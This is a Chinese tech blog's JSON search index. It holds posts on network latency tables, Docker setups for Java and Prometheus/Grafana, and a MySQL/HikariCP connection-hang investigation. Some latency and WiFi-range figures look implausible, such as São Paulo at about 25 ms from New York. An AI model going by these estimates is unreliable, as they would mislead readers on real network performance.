{"meta":{"title":"wuhaocn","subtitle":"","description":"","author":"wuhao","url":"https://wuhaocn.github.io","root":"/"},"pages":[{"title":"书单","date":"2022-12-31T02:23:22.689Z","updated":"2021-07-26T01:33:15.070Z","comments":false,"path":"books/index.html","permalink":"https://wuhaocn.github.io/books/index.html","excerpt":"","text":""},{"title":"关于","date":"2022-12-31T02:23:22.689Z","updated":"2021-07-26T01:33:15.069Z","comments":false,"path":"about/index.html","permalink":"https://wuhaocn.github.io/about/index.html","excerpt":"","text":"个人详细介绍"},{"title":"标签","date":"2022-12-31T02:23:22.690Z","updated":"2021-07-26T01:33:15.071Z","comments":false,"path":"tags/index.html","permalink":"https://wuhaocn.github.io/tags/index.html","excerpt":"","text":""},{"title":"git仓库","date":"2022-12-31T02:23:22.690Z","updated":"2021-07-26T01:33:15.071Z","comments":false,"path":"repository/index.html","permalink":"https://wuhaocn.github.io/repository/index.html","excerpt":"","text":""},{"title":"分类","date":"2022-12-31T02:23:22.690Z","updated":"2021-07-26T02:15:38.649Z","comments":false,"path":"categories/index.html","permalink":"https://wuhaocn.github.io/categories/index.html","excerpt":"","text":"1.编程语言1.1.java1.1.c1.1.go2.技术中间件3.devops4.算法4.1.常见算法4.2.分布式算法5.计算机基础5.1.网络"},{"title":"友情链接","date":"2022-12-31T02:23:22.690Z","updated":"2021-07-26T01:33:15.071Z","comments":true,"path":"links/index.html","permalink":"https://wuhaocn.github.io/links/index.html","excerpt":"","text":""}],"posts":[{"title":"基础网络链路介绍","slug":"network/3gpp/基础网络链路介绍","date":"2023-11-15T06:28:30.065Z","updated":"2023-11-15T06:28:55.384Z","comments":true,"path":"2023/11/15/network/3gpp/基础网络链路介绍/","link":"","permalink":"https://wuhaocn.github.io/2023/11/15/network/3gpp/%E5%9F%BA%E7%A1%80%E7%BD%91%E7%BB%9C%E9%93%BE%E8%B7%AF%E4%BB%8B%E7%BB%8D/","excerpt":"","text":"基础网络链路介绍移动网络 移动网络带宽及延迟 网络类型 延迟 带宽 理论覆盖半径 典型频段 3GPP规范 推出年份 2G 约300-400 毫秒 0.1 Mbps 5-10公里 GSM: 850 MHz, 900 MHz, 1800 MHz, 1900 MHz GSM 1991 3G 约100-300 毫秒 1-10 Mbps 2-5公里 UMTS: 850 MHz, 900 MHz, 1900 MHz, 2100 MHz UMTS 2001 (WCDMA) 4G 约20-50 毫秒 10-100 Mbps 1-3公里 LTE: 频段因地区而异 LTE 2009 5G 目标小于1毫秒 100 Mbps - 10 Gbps 100-300米 Sub-6 GHz频段 (e.g., n41, n78), 毫米波频段 (e.g., n260, n261) 5G NR 2019 (初步部署) wifi 不同wifi标准 WiFi标准 理论带宽 理论延迟 空旷地区理论覆盖距离（半径） 802.11a 54 Mbps 约 15 ms 较短（几十米至百米） 802.11b 11 Mbps 约 30 ms 较短（几十米至百米） 802.11g 54 Mbps 约 15 ms 较短（几十米至百米） 802.11n 最高 600 Mbps（4x4 MIMO） 约 8 ms 较长（百米至两百米） 802.11ac 最高 3.5 Gbps（8x8 MIMO） 约 3 ms 更长（数百米至千米） 802.11ax 最高 9.6 Gbps（8x8 MIMO） 约 2 ms 更长（数百米至千米） 网络链路 全球各大洲网络延迟 出发地/目的地 中国（上海） 新加坡 北美（纽约） 沙特（利雅得） 大洲 中国（上海） - 约 50 毫秒 约 150 毫秒 约 180 毫秒 亚洲 新加坡 约 50 毫秒 - 约 180 毫秒 约 110 毫秒 亚洲 北美（纽约） 约 150 毫秒 约 180 毫秒 - 约 230 毫秒 北美洲 沙特（利雅得） 约 180 毫秒 约 110 毫秒 约 230 毫秒 - 亚洲 伦敦 约 180 毫秒 约 250 毫秒 约 70 毫秒 约 60 毫秒 欧洲 圣保罗 约 250 毫秒 约 280 毫秒 约 25 毫秒 约 180 毫秒 南美洲 纳加克特 约 250 毫秒 约 290 毫秒 约 25 毫秒 约 180 毫秒 北美洲 开普敦 约 300 毫秒 约 310 毫秒 约 160 毫秒 约 220 毫秒 非洲 悉尼 约 180 毫秒 约 210 毫秒 约 150 毫秒 约 220 毫秒 大洋洲 备注这个表格提供了从中国（上海）、新加坡和北美（纽约）、沙特（利雅得）到一些世界主要城市的理论专线延迟估算值。这些值是基于直线距离和理论网络传输速度的估算，实际延迟可能会受到多种因素的影响，包括网络拥塞、路由选择、传输介质的类型等。 协议耗时 协议 建联消耗 备注 TCP 1-RTT - QUIC 0-1RTT 可开启0-RTT TCP+TLS1.2 3-RTT - TCP+TLS1.3 1~2RTT TLS1.3开启0-RTT，整体在1-RTT 网络覆盖率 移动网络覆盖 https://www.gsma.com/mobileeconomy/wp-content/uploads/2023/03/270223-The-Mobile-Economy-2023.pdf 现状 2022 中国 北美 欧洲 4/5G 覆盖率在80%以上 ，其他地域在80%以下 2030 中东和北非 4/5G 覆盖率在90%以下，其他区域在90%以上 详细","categories":[{"name":"net","slug":"net","permalink":"https://wuhaocn.github.io/categories/net/"}],"tags":[{"name":"net","slug":"net","permalink":"https://wuhaocn.github.io/tags/net/"}]},{"title":"docker-java运行环境","slug":"devops/docker/运行环境搭建-Java","date":"2023-11-15T03:43:01.859Z","updated":"2023-11-15T03:43:01.859Z","comments":true,"path":"2023/11/15/devops/docker/运行环境搭建-Java/","link":"","permalink":"https://wuhaocn.github.io/2023/11/15/devops/docker/%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-Java/","excerpt":"","text":"基础 jar123docker stop jappdocker rm jappdocker run --name japp --privileged=true -p 3337:3306 -e MYSQL_ROOT_PASSWORD=coral@2018 -d mysql:5.7.19 安装扩展 java redis123456789101112131415161718apt-key del 5072E1F5apt-get updateapt-key adv --keyserver keyserver.ubuntu.com --recv 8C718D3B5072E1F5apt-get updatelscd /rootlscd jdk1.8.0_251/lscd ..vim /etc/profileapt-get install vimvim /etc/profilesource /etc/profilejava -vjava -versionapt-get install redis-serverls 打包推送12345docker commit e9c1ad83b80a wuhaocn/javaapp:8docker tag wuhaocn/javaapp:8 wuhaocn/javaapp:8docker push wuhaocn/javaapp:8 运行123docker stop jappdocker rm jappdocker run --name japp --privileged=true -p 3337:3306 16379:6379 -d wuhaocn/javaapp:8","categories":[{"name":"devops","slug":"devops","permalink":"https://wuhaocn.github.io/categories/devops/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://wuhaocn.github.io/tags/docker/"},{"name":"java","slug":"java","permalink":"https://wuhaocn.github.io/tags/java/"}]},{"title":"docker-监控环境搭建.md","slug":"devops/docker/运行环境搭建-监控","date":"2023-11-15T03:43:01.859Z","updated":"2023-11-15T03:43:01.859Z","comments":true,"path":"2023/11/15/devops/docker/运行环境搭建-监控/","link":"","permalink":"https://wuhaocn.github.io/2023/11/15/devops/docker/%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-%E7%9B%91%E6%8E%A7/","excerpt":"","text":"1.镜像使用(一体化)1.1.镜像安装 手工配置 1234docker stop monitordocker rm monitordocker run --name monitor --privileged=true -p 9090:9090 -p 3000:3000 -d wuhaocn/monitor:1.0docker update monitor --restart=always 自动发现 12345docker stop monitor-consuldocker rm monitor-consuldocker run --name monitor-consul --privileged=true -p 18500:8500 -p 19090:9090 -p 13000:3000 -d wuhaocn/monitor:2.0docker update monitor-consul --restart=always 注册节点信息 123456curl -X PUT -d &#x27;&#123;&quot;id&quot;: &quot;test1&quot;,&quot;name&quot;: &quot;test1&quot;,&quot;address&quot;: &quot;192.168.56.12&quot;,&quot;port&quot;: 9100,&quot;tags&quot;: [&quot;service&quot;],&quot;checks&quot;: [&#123;&quot;http&quot;: &quot;http://192.168.56.12:9100/&quot;,&quot;interval&quot;: &quot;5s&quot;&#125;]&#125;&#x27; http://192.168.56.12:8502/v1/agent/service/registercurl -X PUT -d &#x27;&#123;&quot;id&quot;: &quot;test1&quot;,&quot;name&quot;: &quot;test1&quot;,&quot;address&quot;: &quot;192.168.56.12&quot;,&quot;port&quot;: 9100,&quot;tags&quot;: [&quot;service&quot;],&quot;checks&quot;: [&#123;&quot;http&quot;: &quot;http://192.168.56.12:9100/&quot;,&quot;interval&quot;: &quot;5s&quot;&#125;]&#125;&#x27; http://192.168.56.12:8502/v1/agent/service/unregisterhttps://www.consul.io/api-docs/agent/service#register-servicehttps://www.consul.io/api-docs/agent/service#deregister-service 1.2.容器配置docker exec -it monitor bash 配置修改地址 /usr/local/grafana123456789root@f23762ac5af0:/usr/local/grafana/conf# lltotal 136drwxr-xr-x 3 root root 4096 Mar 31 12:35 ./drwxr-xr-x 1 root root 4096 Apr 7 02:09 ../-rw-r--r-- 1 root root 56590 Mar 31 12:35 defaults.ini-rw-r--r-- 1 root root 2270 Mar 31 12:35 ldap.toml-rw-r--r-- 1 root root 1045 Mar 31 12:35 ldap_multiple.tomldrwxr-xr-x 7 root root 4096 Mar 31 12:35 provisioning/-rw-r--r-- 1 root root 57840 Mar 31 12:35 sample.ini /usr/local/prometheus 12345678910111213root@f23762ac5af0:/usr/local/prometheus# lltotal 197396drwxr-xr-x 4 root root 4096 Apr 7 02:09 ./drwxr-xr-x 1 root root 4096 Apr 7 02:16 ../-rw-r--r-- 1 root root 6148 Apr 7 01:46 .DS_Store-rw-r--r-- 1 root root 11357 Mar 15 15:30 LICENSE-rw-r--r-- 1 root root 3773 Mar 15 15:30 NOTICEdrwxr-xr-x 2 root root 4096 Mar 15 15:30 console_libraries/drwxr-xr-x 2 root root 4096 Mar 15 15:30 consoles/-rwxr-xr-x 1 root root 105137495 Mar 15 15:21 prometheus*-rw-r--r-- 1 root root 934 Apr 6 06:11 prometheus.yml-rwxr-xr-x 1 root root 96946761 Mar 15 15:23 promtool* 1234567891011121314151617181920212223242526272829303132333435root@9852cf5a3339:/# cat /usr/local/prometheus/prometheus.yml # my global configglobal: scrape_interval: 15s # Set the scrape interval to every 15 seconds. Default is every 1 minute. evaluation_interval: 15s # Evaluate rules every 15 seconds. The default is every 1 minute. # scrape_timeout is set to the global default (10s).# Alertmanager configurationalerting: alertmanagers: - static_configs: - targets: # - alertmanager:9093# Load rules once and periodically evaluate them according to the global &#x27;evaluation_interval&#x27;.rule_files: # - &quot;first_rules.yml&quot; # - &quot;second_rules.yml&quot;# A scrape configuration containing exactly one endpoint to scrape:# Here it&#x27;s Prometheus itself.scrape_configs: # The job name is added as a label `job=&lt;job_name&gt;` to any timeseries scraped from this config. - job_name: &quot;prometheus&quot; # metrics_path defaults to &#x27;/metrics&#x27; # scheme defaults to &#x27;http&#x27;. static_configs: - targets: [&quot;localhost:9090&quot;] - job_name: &#x27;mapplication&#x27; metrics_path: / static_configs: - targets: [&#x27;192.168.3.41:8901&#x27;] 1.3 配置生效修改后重启配置 docker restart monitor 2.镜像使用(拆分)2.1.安装 默认配置 123456789docker stop prometheusdocker rm prometheusdocker run -d --name=prometheus -p 9090:9090 prom/prometheusdocker update prometheus --restart=alwaysdocker stop grafanadocker rm grafanadocker run -d --name=grafana -p 3000:3000 grafana/grafanadocker update grafana --restart=always 修改配置 1234docker stop prometheusdocker rm prometheusdocker run -d --name=prometheus -p 9090:9090 -v /home/rcloud/prometheus/prometheus.yml:/etc/prometheus/prometheus.yml prom/prometheusdocker update prometheus --restart=always 1234567891011121314global: # 默认情况下，每15s拉取一次目标采样点数据。 scrape_interval: 15s # 我们可以附加一些指定标签到采样点度量标签列表中, 用于和第三方系统进行通信, 包括：federation, remote storage, Alertmanager external_labels: # 下面就是拉取自身服务采样点数据配置 monitor: &#x27;codelab-monitor&#x27;scrape_configs: # job名称会增加到拉取到的所有采样点上，同时还有一个instance目标服务的host：port标签也会增加到采样点上 - job_name: &#x27;prometheus&#x27; # 覆盖global的采样点，拉取时间间隔5s scrape_interval: 5s static_configs: - targets: [&#x27;localhost:9090&#x27;] 2.2 登录配置 登录 http://127.0.0.1:3000 修改密码 默认 admin admin 配置 DataSource 127.0.0.1:9090 添加面板 app(metrics)–data–&gt; (?) + prometheus + grafana","categories":[{"name":"devops","slug":"devops","permalink":"https://wuhaocn.github.io/categories/devops/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://wuhaocn.github.io/tags/docker/"},{"name":"grafana","slug":"grafana","permalink":"https://wuhaocn.github.io/tags/grafana/"},{"name":"prometheus","slug":"prometheus","permalink":"https://wuhaocn.github.io/tags/prometheus/"}]},{"title":"MySQL连接挂死原因分析","slug":"data/mysql/MySQL连接挂死原因分析","date":"2023-11-15T03:43:01.853Z","updated":"2023-11-15T03:43:01.853Z","comments":true,"path":"2023/11/15/data/mysql/MySQL连接挂死原因分析/","link":"","permalink":"https://wuhaocn.github.io/2023/11/15/data/mysql/MySQL%E8%BF%9E%E6%8E%A5%E6%8C%82%E6%AD%BB%E5%8E%9F%E5%9B%A0%E5%88%86%E6%9E%90/","excerpt":"","text":"1.背景近期由测试反馈的问题有点多，其中关于系统可靠性测试提出的问题令人感到头疼，一来这类问题有时候属于“偶发”现象，难以在环境上快速复现；二来则是可靠性问题的定位链条有时候变得很长，极端情况下可能要从 a 服务追踪到 z 服务，或者是从应用代码追溯到硬件层面。本次分享的是一次关于 mysql 高可用问题的定位过程，其中曲折颇多但问题本身却比较有些代表性，遂将其记录以供参考。 1.1 业务架构首先，本系统以 mysql 作为主要的数据存储部件。整一个是典型的微服务架构（springboot + springcloud），持久层则采用了如下几个组件： mybatis，实现 sql &lt;-&gt; method 的映射 hikaricp，实现数据库连接池 mariadb-java-client，实现 jdbc 驱动 在 mysql 服务端部分，后端采用了双主架构，前端以 keepalived 结合浮动ip（vip）做一层高可用。如下说明 mysql 部署两台实例，设定为互为主备的关系。 为每台 mysql 实例部署一个 keepalived 进程，由 keepalived 提供 vip 高可用的故障切换。实际上，keepalived 和 mysql 都实现了容器化，而 vip 端口则映射到 vm 上的 nodeport 服务端口上。 业务服务一律使用 vip 进行数据库访问。 keepalived 是基于 vrrp 协议实现了路由层转换的，在同一时刻，vip 只会指向其中的一个虚拟机（master）。当主节点发生故障时，其他的 keepalived 会检测到问题并重新选举出新的 master，此后 vip 将切换到另一个可用的 mysql 实例节点上。这样一来，mysql 数据库就拥有了基础的高可用能力。 另外一点，keepalived 还会对 mysql 实例进行定时的健康检查，一旦发现 mysql 实例不可用会将自身进程杀死，进而再触发 vip 的切换动作。 1.2 问题现象本次的测试用例也是基于虚拟机故障的场景来设计的：持续以较小的压力向业务服务发起访问，随后将其中一台 mysql 的容器实例(master)重启。按照原有的评估，业务可能会产生很小的抖动，但其中断时间应该保持在秒级。然而经过多次的测试后发现，在重启 mysql 主节点容器之后，有一定的概率会出现业务却再也无法访问的情况！ 2.分析过程在发生问题之后，开发同学的第一反应是 mysql 的高可用机制出了问题。由于此前曾经出现过由于 keepalived 配置不当导致 vip 未能及时切换的问题，因此对其已经有所戒备。先是经过一通的排查，然后并没有找到 keepalived 任何配置上的毛病。然后在没有办法的情况下，重新测试了几次，问题又复现了。 紧接着，我们提出了几个疑点： 1.keepalived 会根据 mysql 实例的可达性进行判断，会不会是健康检查出了问题？ 但在本次测试场景中，mysql 容器销毁会导致 keepalived 的端口探测产生失败，这同样会导致 keepalived 失效。如果 keepalived 也发生了中止，那么 vip 应该能自动发生抢占。而通过对比两台虚拟机节点的信息后，发现 vip 的确发生了切换。 业务进程所在的容器是否发生了网络不可达的问题？ 尝试进入容器，对当前发生切换后的浮动ip、端口执行 telnet 测试，发现仍然能访问成功。 2.1 连接池 在排查前面两个疑点之后，我们只能将目光转向了业务服务的db客户端上。从日志上看，在产生故障的时刻，业务侧的确出现了一些异常，如下： 123456789unable to acquire jdbc connection [n/a]java.sql.sqltransientconnectionexception: hikaripool-1 - connection is not available, request timed out after 30000ms. at com.zaxxer.hikari.pool.hikaripool.createtimeoutexception(hikaripool.java:669) ~[hikaricp-2.7.9.jar!/:?] at com.zaxxer.hikari.pool.hikaripool.getconnection(hikaripool.java:183) ~[hikaricp-2.7.9.jar!/:?] ... 这里提示的是业务操作获取连接超时了（超过了30秒）。那么，会不会是连接数不够用呢？业务接入采用的是 hikaricp 连接池，这也是市面上流行度很高的一款组件了。我们随即检查了当前的连接池配置，如下： 1234567891011//最小空闲连接数spring.datasource.hikari.minimum-idle=10//连接池最大大小spring.datasource.hikari.maximum-pool-size=50//连接最大空闲时长spring.datasource.hikari.idle-timeout=60000//连接生命时长spring.datasource.hikari.max-lifetime=1800000//获取连接的超时时长spring.datasource.hikari.connection-timeout=30000 其中 注意到 hikari 连接池配置了 minimum-idle = 10，也就是说，就算在没有任何业务的情况下，连接池应该保证有 10 个连接。更何况当前的业务访问量极低，不应该存在连接数不够使用的情况。除此之外，另外一种可能性则可能是出现了“僵尸连接”，也就是说在重启的过程中，连接池一直没有释放这些不可用的连接，最终造成没有可用连接的结果。开发同学对”僵尸链接”的说法深信不疑，倾向性的认为这很可能是来自于 hikaricp 组件的某个 bug…于是开始走读 hikaricp 的源码，发现应用层向连接池请求连接的一处代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445public class hikaripool&#123; //获取连接对象入口 public connection getconnection(final long hardtimeout) throws sqlexception &#123; suspendresumelock.acquire(); final long starttime = currenttime(); try &#123; //使用预设的30s 超时时间 long timeout = hardtimeout; do &#123; //进入循环，在指定时间内获取可用连接 //从 connectionbag 中获取连接 poolentry poolentry = connectionbag.borrow(timeout, milliseconds); if (poolentry == null) &#123; break; // we timed out... break and throw exception &#125; final long now = currenttime(); //连接对象被标记清除或不满足存活条件时，关闭该连接 if (poolentry.ismarkedevicted() || (elapsedmillis(poolentry.lastaccessed, now) &gt; alivebypasswindowms &amp;&amp; !isconnectionalive(poolentry.connection))) &#123; closeconnection(poolentry, poolentry.ismarkedevicted() ? evicted_connection_message : dead_connection_message); timeout = hardtimeout - elapsedmillis(starttime); &#125; //成功获得连接对象 else &#123; metricstracker.recordborrowstats(poolentry, starttime); return poolentry.createproxyconnection(leaktaskfactory.schedule(poolentry), now); &#125; &#125; while (timeout &gt; 0l); //超时了，抛出异常 metricstracker.recordborrowtimeoutstats(starttime); throw createtimeoutexception(starttime); &#125; catch (interruptedexception e) &#123; thread.currentthread().interrupt(); throw new sqlexception(poolname + &quot; - interrupted during connection acquisition&quot;, e); &#125; finally &#123; suspendresumelock.release(); &#125; &#125;&#125; getconnection() 方法展示了获取连接的整个流程，其中 connectionbag 是用于存放连接对象的容器对象。如果从 connectionbag 获得的连接不再满足存活条件，那么会将其手动关闭，代码如下： 123456789101112131415void closeconnection(final poolentry poolentry, final string closurereason) &#123; //移除连接对象 if (connectionbag.remove(poolentry)) &#123; final connection connection = poolentry.close(); //异步关闭连接 closeconnectionexecutor.execute(() -&gt; &#123; quietlycloseconnection(connection, closurereason); //由于可用连接变少，将触发填充连接池的任务 if (poolstate == pool_normal) &#123; fillpool(); &#125; &#125;); &#125; &#125; 注意到，只有当连接满足下面条件中的其中一个时，会被执行 close。 ismarkedevicted() 的返回结果是 true，即标记为清除，如果连接存活时间超出最大生存时间(maxlifetime)，或者距离上一次使用超过了idletimeout，会被定时任务标记为清除状态，清除状态的连接在获取的时候才真正 close。 500ms 内没有被使用，且连接已经不再存活，即 isconnectionalive() 返回 false 由于我们把 idletimeout 和 maxlifetime 都设置得非常大，因此需重点检查 isconnectionalive 方法中的判断，如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546public class poolbase&#123; //判断连接是否存活 boolean isconnectionalive(final connection connection) &#123; try &#123; try &#123; //设置 jdbc 连接的执行超时 setnetworktimeout(connection, validationtimeout); final int validationseconds = (int) math.max(1000l, validationtimeout) / 1000; //如果没有设置 testquery，使用 jdbc4 的校验接口 if (isusejdbc4validation) &#123; return connection.isvalid(validationseconds); &#125; //使用 testquery（如 select 1）语句对连接进行探测 try (statement statement = connection.createstatement()) &#123; if (isnetworktimeoutsupported != true) &#123; setquerytimeout(statement, validationseconds); &#125; statement.execute(config.getconnectiontestquery()); &#125; &#125; finally &#123; setnetworktimeout(connection, networktimeout); if (isisolateinternalqueries &amp;&amp; !isautocommit) &#123; connection.rollback(); &#125; &#125; return true; &#125; catch (exception e) &#123; //发生异常时，将失败信息记录到上下文 lastconnectionfailure.set(e); logger.warn(&quot;&#123;&#125; - failed to validate connection &#123;&#125; (&#123;&#125;). possibly consider using a shorter maxlifetime value.&quot;, poolname, connection, e.getmessage()); return false; &#125; &#125; &#125; 我们看到，在poolbase.isconnectionalive 方法中对连接执行了一系列的探测，如果发生异常还会将异常信息记录到当前的线程上下文中。随后，在 hikaripool 抛出异常时会将最后一次检测失败的异常也一同收集，如下： 12345678910111213141516171819private sqlexception createtimeoutexception(long starttime)&#123; logpoolstate(&quot;timeout failure &quot;); metricstracker.recordconnectiontimeout(); string sqlstate = null; //获取最后一次连接失败的异常 final throwable originalexception = getlastconnectionfailure(); if (originalexception instanceof sqlexception) &#123; sqlstate = ((sqlexception) originalexception).getsqlstate(); &#125; //抛出异常 final sqlexception connectionexception = new sqltransientconnectionexception(poolname + &quot; - connection is not available, request timed out after &quot; + elapsedmillis(starttime) + &quot;ms.&quot;, sqlstate, originalexception); if (originalexception instanceof sqlexception) &#123; connectionexception.setnextexception((sqlexception) originalexception); &#125; return connectionexception;&#125; 这里的异常消息和我们在业务服务中看到的异常日志基本上是吻合的，即除了超时产生的 “connection is not available, request timed out after xxxms” 消息之外，日志中还伴随输出了校验失败的信息： 123456789101112131415caused by: java.sql.sqlexception: connection.setnetworktimeout cannot be called on a closed connection at org.mariadb.jdbc.internal.util.exceptions.exceptionmapper.getsqlexception(exceptionmapper.java:211) ~[mariadb-java-client-2.2.6.jar!/:?] at org.mariadb.jdbc.mariadbconnection.setnetworktimeout(mariadbconnection.java:1632) ~[mariadb-java-client-2.2.6.jar!/:?] at com.zaxxer.hikari.pool.poolbase.setnetworktimeout(poolbase.java:541) ~[hikaricp-2.7.9.jar!/:?] at com.zaxxer.hikari.pool.poolbase.isconnectionalive(poolbase.java:162) ~[hikaricp-2.7.9.jar!/:?] at com.zaxxer.hikari.pool.hikaripool.getconnection(hikaripool.java:172) ~[hikaricp-2.7.9.jar!/:?] at com.zaxxer.hikari.pool.hikaripool.getconnection(hikaripool.java:148) ~[hikaricp-2.7.9.jar!/:?] at com.zaxxer.hikari.hikaridatasource.getconnection(hikaridatasource.java:128) ~[hikaricp-2.7.9.jar!/:?] 到这里，我们已经将应用获得连接的代码大致梳理了一遍，整个过程如下图所示： 从执行逻辑上看，连接池的处理并没有问题，相反其在许多细节上都考虑到位了。在对非存活连接执行 close 时，同样调用了 removefrombag 动作将其从连接池中移除，因此也不应该存在僵尸连接对象的问题。那么，我们之前的推测应该就是错误的！ 2.2 陷入焦灼在代码分析之余，开发同学也注意到当前使用的 hikaricp 版本为 3.4.5，而环境上出问题的业务服务却是 2.7.9 版本，这仿佛预示着什么… 让我们再次假设 hikaricp 2.7.9 版本存在某种未知的 bug，导致了问题的产生。为了进一步分析连接池对于服务端故障的行为处理，我们尝试在本地机器上进行模拟，这一次使用了 hikaricp 2.7.9 版本进行测试，并同时将 hikaricp 的日志级别设置为 debug。模拟场景中，会由 由本地应用程序连接本机的 mysql 数据库进行操作，步骤如下： 12345671. 初始化数据源，此时连接池 min-idle 设置为 10；2. 每隔50ms 执行一次sql操作，查询当前的元数据表；3. 将 mysql 服务停止一段时间，观察业务表现；4. 将 mysql 服务重新启动，观察业务表现。 最终产生的日志如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485//初始化过程，建立10个连接debug -hikaripool.logpoolstate - pool stats (total=1, active=1, idle=0, waiting=0)debug -hikaripool$poolentrycreator.call- added connection mariadbconnection@71ab7c09debug -hikaripool$poolentrycreator.call- added connection mariadbconnection@7f6c9c4cdebug -hikaripool$poolentrycreator.call- added connection mariadbconnection@7b531779...debug -hikaripool.logpoolstate- after adding stats (total=10, active=1, idle=9, waiting=0) //执行业务操作，成功execute statement: truetest time -------1execute statement: truetest time -------2 ...//停止mysql...//检测到无效连接warn -poolbase.isconnectionalive - failed to validate connection mariadbconnection@9225652 ((conn=38652) connection.setnetworktimeout cannot be called on a closed connection). possibly consider using a shorter maxlifetime value.warn -poolbase.isconnectionalive - failed to validate connection mariadbconnection@71ab7c09 ((conn=38653) connection.setnetworktimeout cannot be called on a closed connection). possibly consider using a shorter maxlifetime value.//释放连接debug -poolbase.quietlycloseconnection(poolbase.java:134) - closing connection mariadbconnection@9225652: (connection is dead) debug -poolbase.quietlycloseconnection(poolbase.java:134) - closing connection mariadbconnection@71ab7c09: (connection is dead) //尝试创建连接失败debug -hikaripool.createpoolentry - cannot acquire connection from data sourcejava.sql.sqlnontransientconnectionexception: could not connect to address=(host=localhost)(port=3306)(type=master) : socket fail to connect to host:localhost, port:3306. connection refused: connectcaused by: java.sql.sqlnontransientconnectionexception: socket fail to connect to host:localhost, port:3306. connection refused: connect at internal.util.exceptions.exceptionfactory.createexception(exceptionfactory.java:73) ~[mariadb-java-client-2.6.0.jar:?] ... //持续失败.. 直到mysql重启 //重启后，自动创建连接成功debug -hikaripool$poolentrycreator.call -added connection mariadbconnection@42c5503edebug -hikaripool$poolentrycreator.call -added connection mariadbconnection@695a7435//连接池状态，重新建立10个连接debug -hikaripool.logpoolstate(hikaripool.java:421) -after adding stats (total=10, active=1, idle=9, waiting=0)//执行业务操作，成功（已经自愈）execute statement: true 从日志上看，hikaricp 还是能成功检测到坏死的连接并将其踢出连接池，一旦 mysql 重新启动，业务操作又能自动恢复成功了。根据这个结果，基于 hikaricp 版本问题的设想也再次落空，研发同学再次陷入焦灼。 2.3 拨开云雾见光明多方面求证无果之后，我们最终尝试在业务服务所在的容器内进行抓包，看是否能发现一些蛛丝马迹。进入故障容器，执行_tcpdump -i eth0 tcp port 30052_进行抓包，然后对业务接口发起访问。此时令人诡异的事情发生了，没有任何网络包产生！而业务日志在 30s 之后也出现了获取连接失败的异常。我们通过 netstat 命令检查网络连接，发现只有一个 established 状态的 tcp 连接。也就是说，当前业务实例和 mysql 服务端是存在一个建好的连接的，但为什么业务还是报出可用连接呢？推测可能原因有二： 该连接被某个业务（如定时器）一直占用。 该连接实际上还没有办法使用，可能处于某种僵死的状态。 对于原因一，很快就可以被推翻，一来当前服务并没有什么定时器任务，二来就算该连接被占用，按照连接池的原理，只要没有达到上限，新的业务请求应该会促使连接池进行新连接的建立，那么无论是从 netstat 命令检查还是 tcpdump 的结果来看，不应该一直是只有一个连接的状况。那么，情况二的可能性就很大了。带着这个思路，继续分析 java 进程的线程栈。执行 kill -3 pid 将线程栈输出后分析，果不其然，在当前 thread stack 中发现了如下的条目： 12345678910111213141516171819202122232425262728293031323334353637383940414243&quot;hikaripool-1 connection adder&quot; #121 daemon prio=5 os_prio=0 tid=0x00007f1300021800 nid=0xad runnable [0x00007f12d82e5000] java.lang.thread.state: runnable at java.net.socketinputstream.socketread0(native method) at java.net.socketinputstream.socketread(socketinputstream.java:116) at java.net.socketinputstream.read(socketinputstream.java:171) at java.net.socketinputstream.read(socketinputstream.java:141) at java.io.filterinputstream.read(filterinputstream.java:133) at org.mariadb.jdbc.internal.io.input.readaheadbufferedstream.fillbuffer(readaheadbufferedstream.java:129) at org.mariadb.jdbc.internal.io.input.readaheadbufferedstream.read(readaheadbufferedstream.java:102) - locked &lt;0x00000000d7f5b480&gt; (a org.mariadb.jdbc.internal.io.input.readaheadbufferedstream) at org.mariadb.jdbc.internal.io.input.standardpacketinputstream.getpacketarray(standardpacketinputstream.java:241) at org.mariadb.jdbc.internal.io.input.standardpacketinputstream.getpacket(standardpacketinputstream.java:212) at org.mariadb.jdbc.internal.com.read.readinitialhandshakepacket.&lt;init&gt;(readinitialhandshakepacket.java:90) at org.mariadb.jdbc.internal.protocol.abstractconnectprotocol.createconnection(abstractconnectprotocol.java:480) at org.mariadb.jdbc.internal.protocol.abstractconnectprotocol.connectwithoutproxy(abstractconnectprotocol.java:1236) at org.mariadb.jdbc.internal.util.utils.retrieveproxy(utils.java:610) at org.mariadb.jdbc.mariadbconnection.newconnection(mariadbconnection.java:142) at org.mariadb.jdbc.driver.connect(driver.java:86) at com.zaxxer.hikari.util.driverdatasource.getconnection(driverdatasource.java:138) at com.zaxxer.hikari.pool.poolbase.newconnection(poolbase.java:358) at com.zaxxer.hikari.pool.poolbase.newpoolentry(poolbase.java:206) at com.zaxxer.hikari.pool.hikaripool.createpoolentry(hikaripool.java:477) 这里显示hikaripool-1 connection adder这个线程一直处于 socketread 的可执行状态。从命名上看该线程应该是 hikaricp 连接池用于建立连接的任务线程，socket 读操作则来自于 mariadbconnection.newconnection() 这个方法，即 mariadb-java-client 驱动层建立 mysql 连接的一个操作，其中 readinitialhandshakepacket 初始化则属于 mysql 建链协议中的一个环节。简而言之，上面的线程刚好处于建链的一个过程态，关于 mariadb 驱动和 mysql 建链的过程大致如下：mysql 建链首先是建立 tcp 连接（三次握手），客户端会读取 mysql 协议的一个初始化握手消息包，内部包含 mysql 版本号，鉴权算法等等信息，之后再进入身份鉴权的环节。这里的问题就在于 readinitialhandshakepacket 初始化（读取握手消息包）一直处于 socket read 的一个状态。如果此时 mysql 远端主机故障了，那么该操作就会一直卡住。而此时的连接虽然已经建立（处于 established 状态），但却一直没能完成协议握手和后面的身份鉴权流程，即该连接只能算一个半成品（无法进入 hikaricp 连接池的列表中）。从故障服务的 debug 日志也可以看到，连接池持续是没有可用连接的，如下：debug hikaripool.logpoolstate –&gt; before cleanup stats (total=0, active=0, idle=0, waiting=3)另一个需要解释的问题则是，这样一个 socket read 操作的阻塞是否就造成了整个连接池的阻塞呢？经过代码走读，我们再次梳理了 hikaricp 建立连接的一个流程，其中涉及到几个模块： hikaripool，连接池实例，由该对象连接的获取、释放以及连接的维护。 